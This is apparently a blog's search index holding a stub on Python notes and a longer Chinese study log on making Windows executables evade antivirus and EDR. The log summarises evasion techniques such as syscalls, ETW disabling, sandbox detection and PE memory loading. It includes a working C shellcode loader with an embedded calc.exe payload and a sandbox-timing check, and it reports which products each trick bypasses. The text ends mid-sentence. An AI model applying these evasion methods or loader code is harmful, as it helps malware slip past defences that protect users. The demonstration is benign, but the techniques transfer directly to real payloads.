<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2023.7.17-机器学习入门【更新ing】</title>
    <link href="/2023/07/17/2023.7.17-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E3%80%90%E6%9B%B4%E6%96%B0ing%E3%80%91/"/>
    <url>/2023/07/17/2023.7.17-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E3%80%90%E6%9B%B4%E6%96%B0ing%E3%80%91/</url>
    
    <content type="html"><![CDATA[<p>[2023.7.16完结]，记录python复习的笔记，观看b站小甲鱼的<a href="https://www.bilibili.com/video/BV1c4411e77t">《零基础入门学习Python》最新版</a>，倍速刷过一遍，记录一些遗忘的知识点。</p><p>描述：</p><span id="more"></span><h1 id="2023-7-17-机器学习入门"><a href="#2023-7-17-机器学习入门" class="headerlink" title="2023.7.17-机器学习入门"></a>2023.7.17-机器学习入门</h1><p>[toc]</p>]]></content>
    
    
    
    <tags>
      
      <tag>机器学习</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023.7.17-window免杀技术【更新ing】</title>
    <link href="/2023/07/17/2023.7.17-window%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E3%80%90%E6%9B%B4%E6%96%B0ing%E3%80%91/"/>
    <url>/2023/07/17/2023.7.17-window%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E3%80%90%E6%9B%B4%E6%96%B0ing%E3%80%91/</url>
    
    <content type="html"><![CDATA[<p>描述：记录一些免杀技术的文章</p><p>[]，是是</p><span id="more"></span><h1 id="2023-7-17-window免杀技术"><a href="#2023-7-17-window免杀技术" class="headerlink" title="2023.7.17-window免杀技术"></a>2023.7.17-window免杀技术</h1><p>[toc]</p><h2 id="0x0-需求"><a href="#0x0-需求" class="headerlink" title="0x0-需求"></a>0x0-需求</h2><p>输入一个被杀软查杀的exe，输出一个免杀的exe</p><p>即对exe免杀，不是对shellcode免杀</p><h2 id="0x1-免杀知识"><a href="#0x1-免杀知识" class="headerlink" title="0x1-免杀知识"></a>0x1-免杀知识</h2><h3 id="看雪：静态恶意代码免杀"><a href="#看雪：静态恶意代码免杀" class="headerlink" title="看雪：静态恶意代码免杀 "></a><a href="https://bbs.kanxue.com/thread-271207.htm">看雪：静态恶意代码免杀 </a></h3><blockquote><ol><li>恶意代码开发<ol><li>前言：杀软检测工作原理+杀躲避检测技术</li><li>基本知识</li><li>过沙箱：检测虚拟化环境+虚拟环境中的特征值+检测当前环境运行的时间</li><li>PE资源加载执行</li><li>混淆：Shellcode亦或混淆加密、AES混淆加密</li><li>分离</li><li>注入：远线程注入+监控内存+APC注入</li><li>隐藏导入表函数：Loadlibrary，</li><li>最后</li></ol></li></ol><p>介绍了大部分免杀技术，大部分针对于shellcode，也包括沙箱逃逸的动态免杀。</p><p>但每个技术点比较粗略，需要深入。</p></blockquote><h3 id="红队策略：结合直接系统调用和-sRDI-绕过-AV-x2F-EDR"><a href="#红队策略：结合直接系统调用和-sRDI-绕过-AV-x2F-EDR" class="headerlink" title="红队策略：结合直接系统调用和 sRDI 绕过 AV&#x2F;EDR"></a><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">红队策略：结合直接系统调用和 sRDI 绕过 AV&#x2F;EDR</a></h3><blockquote><p> <a href="https://outflank.nl/blog/author/cornelis/">科内利斯</a> | 2019 年 6 月 19 日</p><p> 在这篇博文中，我们将探讨直接系统调用的使用、恢复挂钩的 API 调用，并最终将其与称为sRDI的 shellcode 注入技术结合起来 。我们将在概念验证代码中结合这些技术，该代码可用于使用 Cobalt Strike 创建 LSASS 内存转储，同时不接触磁盘并逃避 AV&#x2F;EDR 监控的用户模式 API 调用。</p><p> 我：大概是通过ntdll.dll，直接获取内核API，防止用户层API钩子的检测</p><p> kenel32.dll</p><p> ntdll.dll</p></blockquote><h3 id="2022年工业级EDR绕过蓝图"><a href="#2022年工业级EDR绕过蓝图" class="headerlink" title="2022年工业级EDR绕过蓝图"></a><a href="https://www.ctfiot.com/74765.html">2022年工业级EDR绕过蓝图</a></h3><blockquote><p>这篇博客中会涉及如下的技术用于最终执行我们的恶意shellcode，或者说是实现shellcode加载器：</p><ol><li><p>Shellcode 加密</p></li><li><p>减少熵值：shellcode加密数据熵值高，图像数据、英文字符熵值低</p></li><li><p>绕过AV沙盒：环境检测、延时执行</p></li><li><p>导入表混淆：隐藏API调用，绕过API灰名单</p></li><li><p>禁用ETW：？，ETW事件跟踪，内核API实现，可禁用</p></li><li><p>绕过常见的恶意API调用模式</p></li><li><p>直接系统调用，或者说规避syscall的监控：从ntdll.dll获取内核API</p></li><li><p>移除ntdll.dll中的hook：覆盖ntdll.dll</p></li><li><p>伪造线程调用栈：？</p></li><li><p>beacon内存加密：？权限读取，hook掉sleep函数，添加VEH处理链，睡眠钱将shellcode加密、内存为不可执行，执行shellcode触发VEH异常，由VEH处理函数解密shellcode以及修改内存为可执行。</p><p>注意：很多杀软会对sleep进行识别，因为正常文件一般不用用sleep</p></li><li><p>自定义反射式加载：反射式DLL注入</p></li><li><p>Malleable profile中的OpSec 配置</p></li></ol><p>我：主要是针对shellcode或恶意代码本身</p><p>相似文章：<a href="https://blog.csdn.net/jentle8/article/details/126771022">AV&#x2F;EDR 免杀逃避技术汇总</a>：通俗的语言，并且每个方法都给了github链接</p></blockquote><h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a><a href="https://profesmoriarty.github.io/posts/bypass.html">静态免杀</a></h3><blockquote><p>主要介绍shellcode加载方式，利用动态加载API（LoadLibrary+GetProcAddr）来逃避导入表的检测。</p><p>其中LoadLibrary和GetProcAddr可以手动解析kernel32.dll获取</p><p>疑惑点：如果沙箱hook掉kernel32.dll中的这些API，那我们手动解析+动态加载依然会被检测。</p><p>但文章也说：只是bypass静态免杀，有一定效果</p></blockquote><h3 id="exe、shellcode免杀-完美绕过360"><a href="#exe、shellcode免杀-完美绕过360" class="headerlink" title="exe、shellcode免杀 完美绕过360"></a><a href="https://cloud.tencent.com/developer/article/2129786">exe、shellcode免杀 完美绕过360</a></h3><blockquote><p>github上的项目，linux（kali）上运行，对<strong>exe</strong>和shelcode进行免杀处理，生成新的exe或shellcode</p><p>github地址：<a href="https://github.com/lengjibo/FourEye">https://github.com/lengjibo/FourEye</a></p><p>已测试，能成功（x86&#x2F;x64）。但是生成的软件（linux编译，体积较大），win10上能运行，win7上失败（可能我win7的问题）</p><p>目前<strong>火绒</strong>已对其标记，<strong>360免杀</strong>。</p></blockquote><h3 id="PEzor"><a href="#PEzor" class="headerlink" title="PEzor"></a><a href="https://github.com/phra/PEzor">PEzor</a></h3><blockquote><p>这个工具也可以对exe进行免杀处理</p><p>但是使用比较复杂，而且我没有安装成功，直接把kali搞坏重装了。。。</p></blockquote><h3 id="免杀任意EXE"><a href="#免杀任意EXE" class="headerlink" title="免杀任意EXE"></a><a href="https://www.freebuf.com/sectool/278200.html">免杀任意EXE</a></h3><blockquote><p>实际上就是<strong>内存加载</strong>，模拟系统加载exe</p><p>过程：</p><ol><li>将PE文件按照内存对齐映射到内存</li><li>修复IAT表</li><li>修复重定位表</li><li>更改内存区域为可执行，跳转到程序OEP</li></ol></blockquote><h3 id="免杀基础入门篇"><a href="#免杀基础入门篇" class="headerlink" title="免杀基础入门篇"></a><a href="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/">免杀基础入门篇</a></h3><blockquote><p>静态查杀-&gt;免杀方法:<br>动态查杀（主动防御）<br>一些免杀技巧：计算机相关、网络相关、payload基本结构、分离免杀<br>总结：免杀要打组合拳</p><p>我：入门性文章，讲了一些基础性概念，免杀主要讲静态查杀，未涉及沙箱。</p><p>文中涉及的shellcode免杀，包括内存加载，有被EDR查杀的情况，实际上是被本地沙箱查杀了（文中没写）。</p><p>文中提到的<strong>网络通信</strong>不太会、<strong>stager</strong>不懂。</p></blockquote><h3 id="那些shellcode免杀总结"><a href="#那些shellcode免杀总结" class="headerlink" title="那些shellcode免杀总结"></a><a href="https://xz.aliyun.com/t/7170">那些shellcode免杀总结</a></h3><blockquote><p>shellcode”分离”免杀：加载器执行shellcode、Lolbins白利用加载shellcode<br>shellcode”混淆”免杀：shellcode编码混淆（使用模板和编码器）、shellcode注入混淆</p><p>我：本文主要针对shellcode的免杀，无外乎分离、混淆。含代码C、python、C#、powershell。</p><p>混淆只能过静态免杀、分离可过沙箱免杀。</p></blockquote><h3 id="CS免杀-剪切板加载器"><a href="#CS免杀-剪切板加载器" class="headerlink" title="CS免杀-剪切板加载器"></a><a href="https://forum.butian.net/share/711">CS免杀-剪切板加载器</a></h3><blockquote><p>利用windows API <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerclipboardformatw">RegisterClipboardFormat</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardformatnamew">GetClipboardFormatName </a>，进行内存加载shellcode免杀</p><p>同样是shellcode免杀，python作为加载器。</p><p>文章含源码，从msf获取的shellcode，利用python的ctypes调用win API进行内存加载。</p><p>实测可用，win7测试可用。</p><p>利用cmd命令<code>pyinstaller -F -w test.py</code>，打包生成test.exe，能过360查杀，不能过火绒（本地沙箱，被动态查杀）</p><ul><li><p>（执行py文件，不会被火绒动态查杀！！）</p><p>可以用过cpp调用命令行执行py文件，来免杀。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>                          <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>system(<span class="hljs-string">&quot;test.py&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>属于<strong>shellcode分离</strong>免杀，实际效果可能不好，因为不保证目标机器有python环境。</p></li></ul><p>参考链接：<a href="https://blog.csdn.net/zl834205311/article/details/125905705">python文件打包成可执行文件exe的两种方法</a></p></blockquote><h3 id="From-Memory-Loading-to-Everything-Part-1"><a href="#From-Memory-Loading-to-Everything-Part-1" class="headerlink" title="From Memory Loading to Everything - Part 1"></a><a href="https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1/">From Memory Loading to Everything - Part 1</a></h3><blockquote><p>讲了内存加载的两点注意事项：</p><ul><li><p>将内存加载的模块设置为主模块</p><p>需要修改 <code> (HMODULE)(PVOID)NtCurrentPeb()-&gt;ImageBaseAddress</code>以及LDR链上的EXE模块基址</p></li><li><p>修改TLS 表</p><p>这个没细看，不太懂……</p></li></ul></blockquote><h3 id="木马杂谈"><a href="#木马杂谈" class="headerlink" title="木马杂谈"></a><a href="https://citrusice.github.io/posts/something-ablout-malware/">木马杂谈</a></h3><blockquote><p>以红队的角度，谈木马，更底层，一些杂谈，挺不错。</p><ul><li>bypass主动防御、权限维持</li><li>Fully UnDetectable - 木马的伪装与特征隐藏</li><li>anti analysis</li><li>关于语言选择</li></ul></blockquote><h3 id="使用内存加载躲避静态查杀"><a href="#使用内存加载躲避静态查杀" class="headerlink" title="使用内存加载躲避静态查杀"></a><a href="https://citrusice.github.io/posts/memory-execute/">使用内存加载躲避静态查杀</a></h3><blockquote><p>重点讨论exe内存加载的过程</p><p>其中谈到几点：</p><ul><li>如何加载<strong>无重定位表的PE</strong>：将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序</li><li>加载<strong>带命令行参数的exe</strong>：修改传递给被加载程序的命令行参数。如果只是加载一些木马就不需要考虑命令行参数的问题。</li></ul></blockquote><h3 id="防止第-3-方-DLL-注入您的恶意软件"><a href="#防止第-3-方-DLL-注入您的恶意软件" class="headerlink" title="防止第 3 方 DLL 注入您的恶意软件"></a><a href="https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes">防止第 3 方 DLL 注入您的恶意软件</a></h3><blockquote><p>通过 Windows 阻止非 Microsoft 签名的二进制文件注入到该进程中的方式启动新进程。</p><p>利用Win API：</p><ul><li><p>作用于创建的子进程：<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute">UpdateProcThreadAttribute</a>，设置一个属性<code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code>，</p><p>只能</p></li><li><p>可以作用于本进程：<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy">SetProcessMitigationPolicy</a>，在调用API初始化之后，可实现效果。</p></li></ul></blockquote><h3 id="ALaris-shellcode免杀loader的技术原理"><a href="#ALaris-shellcode免杀loader的技术原理" class="headerlink" title="ALaris shellcode免杀loader的技术原理"></a><a href="https://xz.aliyun.com/t/9723">ALaris shellcode免杀loader的技术原理</a></h3><blockquote><p>记录了一些C实现的windows免杀技术，参考的github项目：<a href="https://github.com/cribdragg3r/Alaris">https://github.com/cribdragg3r/Alaris</a></p><ul><li>防止第三方DLL注入<br>Syscall<br>进程注入手段<br>APC注入在实战中的场景<br>shellcode加密<br>父进程欺骗<br>执行后覆盖自身shellcode<br>隐藏启动窗口<br>查杀规则</li></ul><p>很实战，有效果</p></blockquote><h3 id="免杀技术-使用纤程免杀"><a href="#免杀技术-使用纤程免杀" class="headerlink" title="免杀技术-使用纤程免杀"></a><a href="https://cloud.tencent.com/developer/article/2248504">免杀技术-使用纤程免杀</a></h3><blockquote><p>来此于b站视频：<a href="https://www.bilibili.com/video/BV1LA411B7Mk/?spm_id_from=333.999.0.0&vd_source=d1c17238fa5d3ad3b5a69292b0d905a4">小白也能学:利用纤程快速免杀Defender、360、卡巴斯基</a></p><p>细节没看，文章里有一些不错的免杀代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Comdlg32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-comment">//阻止除微软签名的代码，注入该进程</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BLockDll</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//定义一个标志</span><br>    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = &#123;&#125;;<br>    sp.MicrosoftSignedOnly = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//调用进程设置缓解策略。 缓解策略使流程能够加强自身以抵御各种类型的攻击</span><br>    <span class="hljs-comment">//ProcessSignaturePolicy意思就是限制为只能加载微软签名的</span><br>    SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;sp, <span class="hljs-keyword">sizeof</span>(sp));<br>&#125;<br><br><span class="hljs-type">bool</span> 检查沙箱()<br>&#123;<br>    <span class="hljs-type">clock_t</span> start = clock();<br><br>    Sleep(<span class="hljs-number">2000</span>);<br><br>    <span class="hljs-type">clock_t</span> end = clock();<br>    <span class="hljs-keyword">if</span> (end - start &gt;= <span class="hljs-number">2000</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></blockquote><h2 id="0x2-免杀总结"><a href="#0x2-免杀总结" class="headerlink" title="0x2-免杀总结"></a>0x2-免杀总结</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>以上大部分都是对shellcode的免杀，或者是恶意代码exe在开发过程中进行免杀代码编写；</p><p>而对现成的exe免杀生成新的exe，达到免杀处理，这种较少。</p><p>exe免杀：</p><ol><li><p><strong>定位exe被杀软检测的特征码，更改</strong></p><p><strong>具体操作</strong>：使用工具、手动。（没细看）</p><p><strong>缺点</strong>：只能修改一些无用信息 例如字符串之类的，若修改代码的字节码，需慎重。</p></li><li><p><strong>内存加载：PELoader加载整个exe</strong></p><p><strong>具体操作</strong>：把exe作为shellcode，进行加密保存 到PELoad得新建节区，PELoader负责解密并加载运行。同时，可以有种加密解密的PELoader对应exe，放在后台。</p><p><strong>缺点</strong>：比较笨重。（优点：主流 exe免杀过杀软的方法，对shellcode的免杀方法很多）</p></li><li><p><strong>exe加壳</strong></p><p><strong>具体操作</strong>：使用开源壳加壳工具，或者自己写的壳。</p><p><strong>缺点</strong>：常见壳容易被杀软标记。</p></li></ol><p>免杀，程序伪装得越简单越好。越复杂，杀软分析不了，就会各项值打高分，达到预定值就报毒。</p><p>此外，<strong>还有一种免杀方式：shelcode、加载器分离</strong>，分为两个文件，这样大概率是免杀，同时过沙箱（沙箱运行环境中不存在分离的shellcode，故启动失败），参考文章：<a href="https://xz.aliyun.com/t/7170">先知社区：那些shellcode免杀总结</a></p><p>下图来自于：<a href="https://www.bilibili.com/video/BV1mY411e7jF/?spm_id_from=333.999.0.0&vd_source=d1c17238fa5d3ad3b5a69292b0d905a4">B站：聊聊EDR对抗</a></p><p><img src="https://gitee.com/cht1/Image/raw/master/image-20230728010035909.png" alt="image-20230728010035909"></p><h2 id="0x3-实现exe免杀demo-exe内存加载"><a href="#0x3-实现exe免杀demo-exe内存加载" class="headerlink" title="0x3-实现exe免杀demo_exe内存加载"></a>0x3-实现exe免杀demo_exe内存加载</h2><h3 id="1-生成测试木马exe"><a href="#1-生成测试木马exe" class="headerlink" title="1-生成测试木马exe"></a>1-生成测试木马exe</h3><p>测试木马exe：一个shellcode加载器。（shellcode弹出计算器）</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include&lt;windows.h&gt;</span><br>int <span class="hljs-title function_">main</span>(<span class="hljs-params">int</span> <span class="hljs-params">argc</span>, <span class="hljs-params">char</span> **<span class="hljs-params">argv</span>)<br>&#123;<br>    <span class="hljs-variable">unsigned</span> <span class="hljs-variable">char</span> <span class="hljs-variable">buf</span>[] <span class="hljs-operator">=</span><br>        <span class="hljs-string">&quot;\xfc\xe8<span class="hljs-char escape_">\x82</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x60</span><span class="hljs-char escape_">\x89</span>\xe5<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x64</span>\x8b<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x30</span>&quot;</span><br>        <span class="hljs-string">&quot;\x8b<span class="hljs-char escape_">\x52</span>\x0c\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x14</span>\x8b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x28</span>\x0f\xb7\x4a<span class="hljs-char escape_">\x26</span><span class="hljs-char escape_">\x31</span>\xff&quot;</span><br>        <span class="hljs-string">&quot;\xac\x3c<span class="hljs-char escape_">\x61</span>\x7c<span class="hljs-char escape_">\x02</span>\x2c<span class="hljs-char escape_">\x20</span>\xc1\xcf\x0d<span class="hljs-char escape_">\x01</span>\xc7\xe2\xf2<span class="hljs-char escape_">\x52</span>&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x57</span>\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x10</span>\x8b\x4a\x3c\x8b\x4c<span class="hljs-char escape_">\x11</span><span class="hljs-char escape_">\x78</span>\xe3<span class="hljs-char escape_">\x48</span><span class="hljs-char escape_">\x01</span>\xd1&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x51</span>\x8b<span class="hljs-char escape_">\x59</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x01</span>\xd3\x8b<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x18</span>\xe3\x3a<span class="hljs-char escape_">\x49</span>\x8b<span class="hljs-char escape_">\x34</span>\x8b&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x01</span>\xd6<span class="hljs-char escape_">\x31</span>\xff\xac\xc1\xcf\x0d<span class="hljs-char escape_">\x01</span>\xc7<span class="hljs-char escape_">\x38</span>\xe0<span class="hljs-char escape_">\x75</span>\xf6<span class="hljs-char escape_">\x03</span>&quot;</span><br>        <span class="hljs-string">&quot;\x7d\xf8\x3b\x7d<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x75</span>\xe4<span class="hljs-char escape_">\x58</span>\x8b<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x01</span>\xd3<span class="hljs-char escape_">\x66</span>\x8b&quot;</span><br>        <span class="hljs-string">&quot;\x0c\x4b\x8b<span class="hljs-char escape_">\x58</span>\x1c<span class="hljs-char escape_">\x01</span>\xd3\x8b<span class="hljs-char escape_">\x04</span>\x8b<span class="hljs-char escape_">\x01</span>\xd0<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x24</span>&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x24</span>\x5b\x5b<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x59</span>\x5a<span class="hljs-char escape_">\x51</span>\xff\xe0\x5f\x5f\x5a\x8b<span class="hljs-char escape_">\x12</span>\xeb&quot;</span><br>        <span class="hljs-string">&quot;\x8d\x5d\x6a<span class="hljs-char escape_">\x01</span>\x8d<span class="hljs-char escape_">\x85</span>\xb2<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x31</span>\x8b\x6f&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x87</span>\xff\xd5\xbb\xe0\x1d\x2a\x0a<span class="hljs-char escape_">\x68</span>\xa6<span class="hljs-char escape_">\x95</span>\xbd\x9d\xff\xd5&quot;</span><br>        <span class="hljs-string">&quot;\x3c<span class="hljs-char escape_">\x06</span>\x7c\x0a<span class="hljs-char escape_">\x80</span>\xfb\xe0<span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x05</span>\xbb<span class="hljs-char escape_">\x47</span><span class="hljs-char escape_">\x13</span><span class="hljs-char escape_">\x72</span>\x6f\x6a&quot;</span><br>        <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x53</span>\xff\xd5<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span>\x6c<span class="hljs-char escape_">\x63</span>\x2e<span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x78</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x00</span>&quot;</span>;<br>    <span class="hljs-variable">void</span> <span class="hljs-operator">*</span><span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">VirtualAlloc</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">sizeof</span> <span class="hljs-variable">buf</span>, <span class="hljs-variable">MEM_COMMIT</span>, <span class="hljs-variable">PAGE_EXECUTE_READWRITE</span>);<br>    <span class="hljs-title function_">memcpy</span>(<span class="hljs-variable">exec</span>, <span class="hljs-variable">buf</span>, <span class="hljs-variable">sizeof</span> <span class="hljs-variable">buf</span>);<br>    ((<span class="hljs-title function_">void</span>(<span class="hljs-operator">*</span>)())<span class="hljs-variable">exec</span>)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意事项：exe必须包含重定位表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//不固定基址，使生成的exe有重定位表</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/FIXED:NO &quot;</span>)</span><br></code></pre></td></tr></table></figure><p>为了使生成的木马exe体积最小，可进行如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 编译器 cl.exe(Visual C++ 6.0)</span><br><span class="hljs-comment">// 没有做任何优化情况下,编译大小为:16K</span><br><span class="hljs-comment">// 编译优化后: 1K (用16进制编辑器把尾部的0x00去掉: 712bytes)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;kernel32.lib&quot;</span>)</span><br><br><span class="hljs-comment">//该设置在win10成功，在win7失败</span><br><span class="hljs-comment">// 作用: 指定节区对齐为0x200字节，</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/ALIGN:0x200&quot;)</span><br><br><span class="hljs-comment">// 作用: 合并节</span><br><span class="hljs-comment">// 将.data节和.rdata节合并到.text节(代码节)</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/merge:.data=.text&quot;)</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/merge:.rdata=.text&quot;)</span><br><br><span class="hljs-comment">// 作用: 指定子[系统](https://www.2cto.com/os/)为windows (和优化无关)</span><br><span class="hljs-comment">// vc编译器默认是console,会有个黑糊糊的CMD窗口,不好看.用windows就好了</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/subsystem:windows&quot;</span>)</span><br><br><span class="hljs-comment">// 作用: 指定入口函数</span><br><span class="hljs-comment">// 子系统为windows的默认入口点WinMain和console的默认入口点main,都会引入</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/ENTRY:main&quot;</span>)</span><br><br><span class="hljs-comment">//不固定基址，使生成的exe有重定位表</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/FIXED:NO &quot;</span>)</span><br></code></pre></td></tr></table></figure><p>生成的测试木马exe，可以用<code>010editer</code>打开，导出成16进制数据，并且可以设置文件类型为c语言文件。方便作为shellcode放入C语言中。</p><blockquote><p>设置如下：</p><p>文件-&gt;导出十六进制-&gt;导出类型-&gt;导出文件 修改为.txt，导出类型 选择C代码。</p></blockquote><p>一个加壳的bug，</p><p>行为：先对exe<strong>加壳</strong>，再取出二进制数据，加密后作为shellcode，放入PELoader的数组中，进行内存加载。</p><p>实际报错了，原因：加壳后的外壳代码会获取当前模块的基址，但再内存加载目标exe时，完成所有加载步骤，目标exe运行自己的外壳代码，获取的自己模块基址，此时报错，并非目标exe基址，而是PELoader这个exe的基址。</p><h3 id="2-demo测试-经验"><a href="#2-demo测试-经验" class="headerlink" title="2-demo测试-经验"></a>2-demo测试-经验</h3><p>内存加载可以过360，不能过火绒</p><p><strong>结论：</strong>火绒监控所有文件落地，如果是exe就跑本地沙箱，会hook掉sleep函数，沙箱内执行、循环扫描内存（shellcode内存解密后 会被扫描到），沙箱内部时间加速。现在大概是这样一个情况。</p><blockquote><p>在shellcode解密前，键入一个<code>__asm&#123; __emit 